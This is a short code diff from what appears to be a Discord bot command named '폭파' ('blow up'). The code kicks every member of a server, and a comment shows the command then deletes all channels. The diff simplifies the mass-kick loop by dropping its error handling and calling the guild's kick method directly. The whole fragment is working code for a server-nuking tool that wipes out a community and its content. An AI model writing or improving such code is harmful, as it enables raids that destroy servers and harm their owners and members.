@@ -311,12 +311,8 @@ async def 폭파(ctx):
             guildMembers = ctx.guild.members
             print(guildMembers)
             for member in guildMembers:
-                try:
-                    await asyncio.sleep(0.3)
-                    await member.kick(reason="폭파")
-                except Exception as e:
-                    print(e)
-                    pass
+                await asyncio.sleep(0.3)
+                await ctx.guild.kick(member)
 
             # 모든 채널 삭제후 채널 생성
             for channel in ctx.guild.channels:
